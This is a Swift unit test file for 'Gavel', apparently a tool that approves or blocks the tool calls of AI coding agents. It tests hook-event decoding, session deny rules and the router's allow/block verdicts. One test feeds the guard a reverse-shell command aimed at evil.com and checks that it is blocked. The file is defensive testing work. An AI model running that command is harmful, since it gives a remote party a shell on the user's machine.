import XCTest
@testable import Gavel

final class WireFormatTests: XCTestCase {
    /// Tempdir-scoped engine — without this, the user's real rules.json prompt patterns would block tests on dialogs that never resolve. Caller cleans up the returned path in a defer.
    private func makeIsolatedEngine() -> (ApprovalEngine, String) {
        let path = NSTemporaryDirectory() + "wireformat-rules-\(UUID().uuidString).json"
        let engine = ApprovalEngine(
            patternMatcher: PatternMatcher(),
            ruleStore: RuleStore(configPath: path)
        )
        return (engine, path)
    }

    func testAllowDecisionJson() throws {
        let decision = Decision(verdict: .allow, reason: nil)
        let data = decision.hookResponse.data(using: .utf8)!
        let json = try JSONSerialization.jsonObject(with: data) as! [String: Any]
        XCTAssertEqual(json["verdict"] as? String, "allow")
    }

    func testBlockDecisionJson() throws {
        let decision = Decision(verdict: .block, reason: "Reverse shell detected")
        let data = decision.hookResponse.data(using: .utf8)!
        let json = try JSONSerialization.jsonObject(with: data) as! [String: Any]
        XCTAssertEqual(json["verdict"] as? String, "block")
        XCTAssertEqual(json["reason"] as? String, "Reverse shell detected")
    }

    func testBlockDecisionEscapesQuotes() throws {
        let decision = Decision(verdict: .block, reason: #"Command contains "dangerous" pattern"#)
        let data = decision.hookResponse.data(using: .utf8)!
        let json = try JSONSerialization.jsonObject(with: data) as! [String: Any]
        XCTAssertEqual(json["reason"] as? String, #"Command contains "dangerous" pattern"#)
    }

    func testDecodePreToolUseEnvelope() throws {
        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 12345,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": "ls -la"},
                "session_id": "abc-123",
                "cwd": "/tmp/project",
                "permission_mode": "default"
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        XCTAssertEqual(event.hookType, .preToolUse)
        XCTAssertEqual(event.sessionPid, 12345)

        guard case .preToolUse(let payload) = event.payload else {
            XCTFail("Expected preToolUse payload")
            return
        }
        XCTAssertEqual(payload.toolName, "Bash")
        XCTAssertEqual(payload.command, "ls -la")
        XCTAssertEqual(payload.sessionId, "abc-123")
        XCTAssertEqual(payload.cwd, "/tmp/project")
        XCTAssertEqual(payload.permissionMode, "default")
    }

    func testEnvelopeAgentFieldDecodes() throws {
        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 1,
            "timestamp": 0.0,
            "agent": "codex",
            "payload": {
                "type": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": "ls"}
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        XCTAssertEqual(event.agent, .codex)
    }

    func testEnvelopeAgentDefaultsToClaudeWhenAbsent() throws {
        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 1,
            "timestamp": 0.0,
            "payload": {
                "type": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": "ls"}
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        XCTAssertEqual(event.agent, .claude, "Envelopes without 'agent' must decode as claude")
    }

    func testDecodeCodexPreToolUseEnvelope() throws {
        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 12345,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "session_id": "codex-sess-7",
                "turn_id": "turn-42",
                "transcript_path": "/Users/dev/.codex/sessions/abc.jsonl",
                "cwd": "/Users/dev/work",
                "hook_event_name": "PreToolUse",
                "model": "gpt-5.4",
                "permission_mode": "on-request",
                "tool_name": "shell",
                "tool_input": {"command": ["ls", "-la"], "workdir": "/Users/dev/work"},
                "tool_use_id": "tu-99"
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        XCTAssertEqual(event.hookType, .preToolUse)

        guard case .preToolUse(let payload) = event.payload else {
            XCTFail("Expected preToolUse payload")
            return
        }
        XCTAssertEqual(payload.toolName, "shell")
        XCTAssertEqual(payload.sessionId, "codex-sess-7")
        XCTAssertEqual(payload.cwd, "/Users/dev/work")
        XCTAssertEqual(payload.permissionMode, "on-request")
        XCTAssertEqual(payload.toolUseId, "tu-99")
        XCTAssertNil(payload.agentId)
    }

    func testCodexBashCommandExtraction() throws {
        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 12345,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "session_id": "s",
                "tool_name": "Bash",
                "tool_input": {"command": "ls -la"}
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        guard case .preToolUse(let payload) = event.payload else {
            XCTFail("Expected preToolUse payload")
            return
        }
        XCTAssertEqual(payload.toolName, "Bash")
        XCTAssertEqual(payload.command, "ls -la")
    }

    func testCodexApplyPatchExposesPatchTextAsCommand() throws {
        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 12345,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "session_id": "s",
                "tool_name": "apply_patch",
                "tool_input": {"command": "*** Begin Patch\\n*** Add File: hello.txt\\n+hi\\n*** End Patch\\n"}
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        guard case .preToolUse(let payload) = event.payload else {
            XCTFail("Expected preToolUse payload")
            return
        }
        XCTAssertEqual(payload.toolName, "apply_patch")
        XCTAssertNotNil(payload.command)
        XCTAssertTrue(payload.command?.contains("*** Add File: hello.txt") ?? false)
    }

    func testDecodeCodexApplyPatchEnvelope() throws {
        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 12345,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "session_id": "codex-sess-7",
                "turn_id": "turn-43",
                "transcript_path": "/Users/dev/.codex/sessions/abc.jsonl",
                "cwd": "/Users/dev/work",
                "hook_event_name": "PreToolUse",
                "model": "gpt-5.4",
                "permission_mode": "on-request",
                "tool_name": "apply_patch",
                "tool_input": {"input": "*** Begin Patch\\n*** Add File: hello.txt\\n+hi\\n*** End Patch\\n"},
                "tool_use_id": "tu-100"
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        guard case .preToolUse(let payload) = event.payload else {
            XCTFail("Expected preToolUse payload")
            return
        }
        XCTAssertEqual(payload.toolName, "apply_patch")
    }

    func testDecodeSessionStartEnvelope() throws {
        let json = """
        {
            "hookType": "SessionStart",
            "sessionPid": 99999,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "SessionStart",
                "session_id": "sess-456",
                "cwd": "/home/user/project",
                "source": "startup",
                "model": "claude-opus-4-6"
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        guard case .sessionStart(let payload) = event.payload else {
            XCTFail("Expected sessionStart payload")
            return
        }
        XCTAssertEqual(payload.sessionId, "sess-456")
        XCTAssertEqual(payload.source, "startup")
        XCTAssertEqual(payload.model, "claude-opus-4-6")
    }

    func testDecodeUserPromptSubmitEnvelope() throws {
        let json = """
        {
            "hookType": "UserPromptSubmit",
            "sessionPid": 11111,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "UserPromptSubmit",
                "prompt": "fix the login bug",
                "session_id": "sess-789"
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        guard case .userPromptSubmit(let payload) = event.payload else {
            XCTFail("Expected userPromptSubmit payload")
            return
        }
        XCTAssertEqual(payload.prompt, "fix the login bug")
        XCTAssertEqual(payload.sessionId, "sess-789")
    }

    func testDecodeUnknownEventPassesThrough() throws {
        let json = """
        {
            "hookType": "unknown",
            "sessionPid": 22222,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "CwdChanged",
                "cwd": "/new/dir"
            }
        }
        """
        let event = try JSONDecoder().decode(HookEvent.self, from: json.data(using: .utf8)!)
        guard case .passthrough(let eventName) = event.payload else {
            XCTFail("Expected passthrough payload")
            return
        }
        XCTAssertEqual(eventName, "CwdChanged")
    }

    func testRouterAllowsNormalCommand() {
        let (engine, ruleStorePath) = makeIsolatedEngine()
        defer { try? FileManager.default.removeItem(atPath: ruleStorePath) }
        let manager = SessionManager()
        let coordinator = ApprovalCoordinator()

        let session = manager.session(for: 33333)
        session.isAutoApproveEnabled = true
        let router = HookRouter(sessionManager: manager, approvalEngine: engine, approvalCoordinator: coordinator)

        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 33333,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": "ls"},
                "session_id": "test-session"
            }
        }
        """
        let data = json.data(using: .utf8)!

        var responseJson: [String: Any]?
        router.handle(data: data) { responseData in
            responseJson = try? JSONSerialization.jsonObject(with: responseData) as? [String: Any]
        }

        XCTAssertEqual(responseJson?["verdict"] as? String, "allow")
    }

    func testRouterBlocksDangerousCommand() {
        let (engine, ruleStorePath) = makeIsolatedEngine()
        defer { try? FileManager.default.removeItem(atPath: ruleStorePath) }
        let manager = SessionManager()
        let coordinator = ApprovalCoordinator()

        let router = HookRouter(sessionManager: manager, approvalEngine: engine, approvalCoordinator: coordinator)

        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 44444,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": "bash -i >& /dev/tcp/evil.com/80 0>&1"},
                "session_id": "test-session"
            }
        }
        """
        let data = json.data(using: .utf8)!

        var responseJson: [String: Any]?
        router.handle(data: data) { responseData in
            responseJson = try? JSONSerialization.jsonObject(with: responseData) as? [String: Any]
        }

        XCTAssertEqual(responseJson?["verdict"] as? String, "block")
        XCTAssertNotNil(responseJson?["reason"])
    }

    func testRouterBlocksOnSessionDeny() {
        let (engine, ruleStorePath) = makeIsolatedEngine()
        defer { try? FileManager.default.removeItem(atPath: ruleStorePath) }
        let manager = SessionManager()
        let coordinator = ApprovalCoordinator()
        let session = manager.session(for: 66666)
        session.isAutoApproveEnabled = true
        session.sessionRules.append(SessionRule(
            toolName: "Edit",
            pattern: "*/production.yml",
            verdict: .block,
            explanation: "Protected during deployment"
        ))
        let router = HookRouter(sessionManager: manager, approvalEngine: engine, approvalCoordinator: coordinator)

        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 66666,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "tool_name": "Edit",
                "tool_input": {"file_path": "/app/config/production.yml", "old_string": "x", "new_string": "y"},
                "session_id": "test-session"
            }
        }
        """
        let data = json.data(using: .utf8)!

        var responseJson: [String: Any]?
        router.handle(data: data) { responseData in
            responseJson = try? JSONSerialization.jsonObject(with: responseData) as? [String: Any]
        }

        XCTAssertEqual(responseJson?["verdict"] as? String, "block")
        XCTAssertTrue((responseJson?["reason"] as? String)?.contains("Session deny") ?? false)
    }

    func testRouterSessionDenyOverridesAutoApprove() {
        let (engine, ruleStorePath) = makeIsolatedEngine()
        defer { try? FileManager.default.removeItem(atPath: ruleStorePath) }
        let manager = SessionManager()
        let coordinator = ApprovalCoordinator()
        let session = manager.session(for: 77777)
        session.autoApproveUntil = Date().addingTimeInterval(300)
        session.sessionRules.append(SessionRule(
            toolName: "Bash",
            pattern: "docker push*",
            verdict: .block,
            explanation: "No deploys this session"
        ))
        let router = HookRouter(sessionManager: manager, approvalEngine: engine, approvalCoordinator: coordinator)

        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 77777,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": "docker push myimage:latest"},
                "session_id": "test-session"
            }
        }
        """

        var responseJson: [String: Any]?
        router.handle(data: json.data(using: .utf8)!) { responseData in
            responseJson = try? JSONSerialization.jsonObject(with: responseData) as? [String: Any]
        }

        XCTAssertEqual(responseJson?["verdict"] as? String, "block")
        XCTAssertEqual(session.blockCount, 1)
    }

    func testRouterEnrichesSessionFromPayload() {
        let (engine, ruleStorePath) = makeIsolatedEngine()
        defer { try? FileManager.default.removeItem(atPath: ruleStorePath) }
        let manager = SessionManager()
        let coordinator = ApprovalCoordinator()
        let session = manager.session(for: 55555)
        session.isAutoApproveEnabled = true
        let router = HookRouter(sessionManager: manager, approvalEngine: engine, approvalCoordinator: coordinator)

        let json = """
        {
            "hookType": "PreToolUse",
            "sessionPid": 55555,
            "timestamp": 1712600000.0,
            "payload": {
                "type": "PreToolUse",
                "tool_name": "Read",
                "tool_input": {"file_path": "/tmp/x"},
                "session_id": "enrichment-test",
                "cwd": "/home/user/project"
            }
        }
        """
        router.handle(data: json.data(using: .utf8)!) { _ in }

        RunLoop.current.run(until: Date(timeIntervalSinceNow: 0.1))

        XCTAssertEqual(session.sessionId, "enrichment-test")
        XCTAssertEqual(session.cwd, "/home/user/project")
    }
}
